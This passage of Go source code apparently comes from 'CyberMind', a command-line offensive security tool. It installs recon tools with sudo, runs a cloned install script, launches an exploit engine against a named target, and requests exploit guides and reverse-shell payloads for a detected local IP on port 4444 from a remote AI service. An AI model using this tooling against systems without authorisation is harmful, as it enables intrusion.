				if err := cmd2.Run(); err == nil {
					installOK = true
				} else {
					// Try without --break-system-packages
					cmd3 := exec.Command("pip3", "install", pt.pipPkg, "-q")
					cmd3.Stdout = os.Stdout
					cmd3.Stderr = os.Stderr
					installOK = cmd3.Run() == nil
				}
			} else if pt.gitRepo != "" {
				// git clone + pip install requirements
				exec.Command("sudo", "rm", "-rf", pt.gitDir).Run()
				cloneCmd := exec.Command("git", "clone", "--depth=1", pt.gitRepo, pt.gitDir)
				cloneCmd.Stdout = os.Stdout
				cloneCmd.Stderr = os.Stderr
				if err := cloneCmd.Run(); err == nil {
					reqFile := pt.gitDir + "/requirements.txt"
					if _, err2 := os.Stat(reqFile); err2 == nil {
						pipCmd := exec.Command("pip3", "install", "-r", reqFile, "-q", "--break-system-packages")
						pipCmd.Stdout = os.Stdout
						pipCmd.Stderr = os.Stderr
						if pipCmd.Run() != nil {
							pipCmd2 := exec.Command("pip3", "install", "-r", reqFile, "-q")
							pipCmd2.Stdout = os.Stdout
							pipCmd2.Stderr = os.Stderr
							pipCmd2.Run()
						}
					}
					// Create symlink
					scriptPath := pt.gitDir + "/" + pt.script
					if _, err2 := os.Stat(scriptPath); err2 == nil {
						exec.Command("sudo", "ln", "-sf", scriptPath, "/usr/local/bin/"+pt.bin).Run()
						exec.Command("sudo", "chmod", "+x", "/usr/local/bin/"+pt.bin).Run()
						installOK = true
					}
				}
			}

			if installOK {
				fmt.Println(lipgloss.NewStyle().Foreground(green).Render(fmt.Sprintf("  ✓ %-16s installed", pt.bin)))
				installed++
			} else {
				fmt.Println(lipgloss.NewStyle().Foreground(red).Render(fmt.Sprintf("  ✗ %-16s failed", pt.bin)))
				failed++
			}
		}

		// ── Step 5: reconftw (meta subdomain tool) ───────────────────────────
		fmt.Println()
		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(cyan).Render("  [5/5] Installing reconftw (meta subdomain pipeline)..."))
		if _, err := exec.LookPath("reconftw"); err == nil {
			fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  - reconftw         already installed"))
			skipped2++
		} else {
			fmt.Println(lipgloss.NewStyle().Foreground(purple).Render("  ⟳ reconftw         cloning from GitHub..."))
			// Remove old install if exists
			exec.Command("sudo", "rm", "-rf", "/opt/reconftw").Run()
			// Clone
			cloneCmd := exec.Command("git", "clone", "--depth=1", "https://github.com/six2dez/reconftw.git", "/opt/reconftw")
			cloneCmd.Stdout = os.Stdout
			cloneCmd.Stderr = os.Stderr
			if err := cloneCmd.Run(); err != nil {
				fmt.Println(lipgloss.NewStyle().Foreground(red).Render("  ✗ reconftw         clone failed: " + err.Error()))
				failed++
			} else {
				// Run reconftw install script
				fmt.Println(lipgloss.NewStyle().Foreground(purple).Render("  ⟳ reconftw         running install.sh (this may take 5-10 minutes)..."))
				installCmd3 := exec.Command("bash", "/opt/reconftw/install.sh")
				installCmd3.Dir = "/opt/reconftw"
				installCmd3.Stdout = os.Stdout
				installCmd3.Stderr = os.Stderr
				if err := installCmd3.Run(); err != nil {
					fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render("  ⚡ reconftw         install.sh had errors (may still work)"))
				}
				// Symlink to /usr/local/bin
				exec.Command("sudo", "ln", "-sf", "/opt/reconftw/reconftw.sh", "/usr/local/bin/reconftw").Run()
				exec.Command("sudo", "chmod", "+x", "/opt/reconftw/reconftw.sh").Run()
				if _, err := exec.LookPath("reconftw"); err == nil {
					fmt.Println(lipgloss.NewStyle().Foreground(green).Render("  ✓ reconftw         installed"))
					installed++
				} else {
					fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render("  ⚡ reconftw         installed at /opt/reconftw/reconftw.sh"))
					installed++
				}
			}
		}

		fmt.Println()
		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(cyan).Render(
			fmt.Sprintf("  Summary: %d installed, %d skipped, %d failed", installed, skipped2, failed)))
		if failed > 0 {
			fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render("  Run: cybermind /doctor  to retry failed tools"))
		}
		fmt.Println()

	case "/abhimanyu":
		// Abhimanyu Mode — standalone exploit engine
		if runtime.GOOS != "linux" {
			printError("Abhimanyu Mode is only available on Linux/Kali.")
			os.Exit(1)
		}
		if len(args) < 2 {
			printError("Usage: cybermind /abhimanyu <target> [vuln-type]")
			printError("Example: cybermind /abhimanyu example.com all")
			printError("Example: cybermind /abhimanyu example.com sqli")
			printError("Vuln types: all, xss, sqli, ssrf, lfi, rce, cmdi, auth, network")
			os.Exit(1)
		}
		abhimanyuTarget := args[1]
		abhimanyuVuln := "all"
		if len(args) >= 3 {
			abhimanyuVuln = args[2]
		}
		if err := recon.ValidateTarget(abhimanyuTarget); err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		if err := storage.Load(); err != nil {
			fmt.Println("Warning:", err)
		}
		runAbhimanyu(abhimanyuTarget, abhimanyuVuln)

	case "update":
		// Self-update: git pull + rebuild + reinstall
		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(cyan).Render("  ⟳ Updating CyberMind..."))
		fmt.Println()

		// Find repo root — check multiple locations including where binary lives
		homedir, _ := os.UserHomeDir()
		// Also check if CYBERMIND_REPO env var is set
		envRepo := os.Getenv("CYBERMIND_REPO")
		repoPaths := []string{}
		if envRepo != "" {
			repoPaths = append(repoPaths, envRepo)
		}
		repoPaths = append(repoPaths,
			".",
			homedir+"/cybermind",
			homedir+"/CyberMind",
			homedir+"/go/src/cybermind",
			"/opt/cybermind",
			"/opt/CyberMind",
		)

		repoPath := ""
		for _, p := range repoPaths {
			if _, err := os.Stat(p + "/.git"); err == nil {
				repoPath = p
				break
			}
		}

		if repoPath == "" {
			printError("Cannot find CyberMind repo.")
			fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render("  Set CYBERMIND_REPO env var to your repo path:"))
			fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  export CYBERMIND_REPO=/path/to/cybermind"))
			fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  Or run manually:"))
			fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  cd /path/to/cybermind/cli && git pull && go build -o cybermind . && sudo mv cybermind /usr/local/bin/"))
			os.Exit(1)
		}

		fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  Found repo at: " + repoPath))

		// git pull — force reset local changes first
		fmt.Println(lipgloss.NewStyle().Foreground(purple).Render("  ⟳ Pulling latest changes..."))
		// Reset any local changes that would block pull
		resetCmd := exec.Command("git", "-C", repoPath, "reset", "--hard", "HEAD")
		resetCmd.Run()
		pullCmd := exec.Command("git", "-C", repoPath, "pull", "origin", "main")
		pullCmd.Stdout = os.Stdout
		pullCmd.Stderr = os.Stderr
		if err := pullCmd.Run(); err != nil {
			printError("git pull failed: " + err.Error())
			os.Exit(1)
		}

		// go build
		cliPath := repoPath + "/cli"
		fmt.Println(lipgloss.NewStyle().Foreground(purple).Render("  ⟳ Building new binary..."))
		buildCmd := exec.Command("go", "build", "-o", "cybermind", ".")
		buildCmd.Dir = cliPath
		buildCmd.Stdout = os.Stdout
		buildCmd.Stderr = os.Stderr
		if err := buildCmd.Run(); err != nil {
			printError("Build failed: " + err.Error())
			os.Exit(1)
		}

		// install
		if runtime.GOOS == "linux" {
			fmt.Println(lipgloss.NewStyle().Foreground(purple).Render("  ⟳ Installing to /usr/local/bin/..."))
			installCmd := exec.Command("sudo", "mv", cliPath+"/cybermind", "/usr/local/bin/cybermind")
			installCmd.Stdout = os.Stdout
			installCmd.Stderr = os.Stderr
			if err := installCmd.Run(); err != nil {
				printError("Install failed (try: sudo mv " + cliPath + "/cybermind /usr/local/bin/)")
				os.Exit(1)
			}
		}

		fmt.Println()
		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(green).Render("  ✓ CyberMind updated successfully!"))
		fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  Run: cybermind --version to confirm"))
		// Auto-run doctor to install any new tools and fix missing ones
		if runtime.GOOS == "linux" {
			fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render("  ⟳ Running /doctor to check and install tools..."))
			doctorCmd := exec.Command("/usr/local/bin/cybermind", "/doctor")
			doctorCmd.Stdout = os.Stdout
			doctorCmd.Stderr = os.Stderr
			_ = doctorCmd.Run()
		}

	case "history":
		if err := storage.Load(); err != nil {
			printError("Could not load history: " + err.Error())
			os.Exit(1)
		}
		storage.PrintHistory()

	case "clear":
		if err := storage.ClearHistory(); err != nil {
			printError("Could not clear history: " + err.Error())
			os.Exit(1)
		}
		fmt.Println(lipgloss.NewStyle().Foreground(green).Render("  ✓ Chat history cleared."))

	case "scan":
		if len(args) < 2 {
			printError("Usage: cybermind scan <target> [type]")
			os.Exit(1)
		}
		target := args[1]
		scanType := "quick"
		if len(args) >= 3 {
			scanType = args[2]
		}
		fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(fmt.Sprintf("  ⟳ Generating %s scan guide for %s...", scanType, target)))
		result, err := api.SendScan(target, scanType)
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		printResult(fmt.Sprintf("Scan Guide [%s] → %s", scanType, target), result)

	case "recon":
		if len(args) < 2 {
			printError("Usage: cybermind recon <target> [type]")
			os.Exit(1)
		}
		target := args[1]
		reconType := "passive"
		if len(args) >= 3 {
			reconType = args[2]
		}
		fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(fmt.Sprintf("  ⟳ Generating %s recon guide for %s...", reconType, target)))
		result, err := api.SendRecon(target, reconType)
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		printResult(fmt.Sprintf("Recon Guide [%s] → %s", reconType, target), result)

	case "exploit":
		if len(args) < 2 {
			printError("Usage: cybermind exploit <vulnerability> [target]")
			os.Exit(1)
		}
		vuln := args[1]
		target := ""
		if len(args) >= 3 {
			target = args[2]
		}
		fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(fmt.Sprintf("  ⟳ Generating exploitation guide for %s...", vuln)))
		result, err := api.SendExploit(vuln, target)
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		printResult("Exploit Guide → "+vuln, result)

	case "payload":
		targetOS := "windows"
		arch := "x64"
		if len(args) >= 2 {
			targetOS = args[1]
		}
		if len(args) >= 3 {
			arch = args[2]
		}
		format := "exe"
		if targetOS == "linux" {
			format = "elf"
		} else if targetOS == "android" {
			format = "apk"
		}
		fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(fmt.Sprintf("  ⟳ Generating %s/%s payload guide...", targetOS, arch)))
		// BUG FIX: use detected local IP instead of hardcoded "YOUR_IP"
		detectedIP := getLocalIP()
		result, err := api.SendPayload(targetOS, arch, detectedIP, "4444", format)
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		printResult(fmt.Sprintf("Payload Guide → %s/%s", targetOS, arch), result)

	case "tool":
		if len(args) < 2 {
			printError("Usage: cybermind tool <toolname> [task]")
			os.Exit(1)
		}
		tool := args[1]
		task := ""
		if len(args) >= 3 {
			task = strings.Join(args[2:], " ")
		}
		fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(fmt.Sprintf("  ⟳ Getting guide for %s...", tool)))
		result, err := api.SendToolHelp(tool, task)
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		printResult("Tool Guide → "+tool, result)

	default:
		// BUG FIX: load storage so history save works
		_ = storage.Load()
		prompt := strings.Join(args, " ")
		fmt.Println(lipgloss.NewStyle().Foreground(purple).Render("  ⟳ Asking CyberMind AI..."))
		result, err := api.SendPrompt(prompt)
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		printResult("Response", result)
		// Save to history
		_ = storage.AddEntry(prompt, result)
	}
}
